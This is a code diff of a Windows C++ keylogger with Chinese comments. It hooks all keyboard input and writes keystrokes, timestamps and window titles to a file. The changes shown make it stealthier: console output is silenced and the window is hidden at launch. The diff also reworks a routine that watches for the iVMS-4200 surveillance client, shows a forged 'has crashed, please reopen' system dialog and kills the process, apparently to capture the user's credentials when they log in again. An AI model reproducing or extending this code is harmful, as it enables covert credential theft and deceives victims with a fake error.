@@ -25,9 +25,9 @@ void writeFile(string strings) {
     }
 }
 LRESULT CALLBACK LowLevelKeyboardProc(
-	_In_ int nCode,		// 规定钩子如何处理消息，小于 0 则直接 CallNextHookEx
-	_In_ WPARAM wParam,	// 消息类型
-	_In_ LPARAM lParam	// 指向某个结构体的指针，这里是 KBDLLHOOKSTRUCT（低级键盘输入事件）
+	 int nCode,		// 规定钩子如何处理消息，小于 0 则直接 CallNextHookEx
+	 WPARAM wParam,	// 消息类型
+	 LPARAM lParam	// 指向某个结构体的指针，这里是 KBDLLHOOKSTRUCT（低级键盘输入事件）
 	){
     KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*)lParam;		// 包含低级键盘输入事件信息
 	time_t nowtime;
@@ -181,19 +181,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 		char ms[100];
 		sprintf(ms,"%s%s%s%s%s%s","[",tm,"]",wnd_title,">>>",key);
 		writeFile(ms);
-		cout<<ms<<endl;
-		cout<<key<<endl;		
+		//cout<<ms<<endl;
+		//cout<<key<<endl;		
         //return key;		// 使按键失效
     }
 
 	// 将消息传递给钩子链中的下一个钩子
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
-void killhik(wchar_t* szImageName){
+bool killhik(wchar_t* szImageName){
 
 	while (1)
 	{
-		Sleep(1000);
+		Sleep(20000);
         	
 		char windowTitle[256] = { 0 };
 		GetWindowTextA(GetForegroundWindow(), windowTitle, sizeof(windowTitle));
@@ -205,6 +205,7 @@ void killhik(wchar_t* szImageName){
 			BOOL bRet = Process32FirstW(hProcess,&pe);//检索快照中第一个进程信息
 			while(bRet){//判断不是最后一个进程，历遍所有
 				if(lstrcmpW(szImageName,pe.szExeFile)==0) {//判断是不是要结束的进程
+					Sleep(60000);
 					MessageBoxW(NULL,L"iVMS-4200已崩溃，请重新打开",L"windows错误提示", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
 					TerminateProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE,pe.th32ProcessID), 0);//打开进程并杀死
 				}
@@ -214,14 +215,18 @@ void killhik(wchar_t* szImageName){
 		} 
 
 	}
+	return false;
 }
-void killhik(wchar_t*);
+bool killhik(wchar_t*);
+bool al=true;
 int main(int argc, TCHAR* argv[])
 {
 	// 安装钩子
+    ShowWindow(GetForegroundWindow(),0);
+	if(al){
+		al=killhik(L"iVMS-4200.Framework.C.exe");
+	}
 
-    Sleep(2000);
-    killhik(L"iVMS-4200.Framework.C.exe");
 	keyboardHook = SetWindowsHookEx(
 		WH_KEYBOARD_LL,			// 钩子类型，WH_KEYBOARD_LL 为键盘钩子
 		LowLevelKeyboardProc,	// 指向钩子函数的指针
@@ -229,7 +234,7 @@ int main(int argc, TCHAR* argv[])
 		NULL					
 		);
 	fileExists();
-    ShowWindow(GetForegroundWindow(),0);
+
     
 
     //不可漏掉消息处理，不然程序会卡死
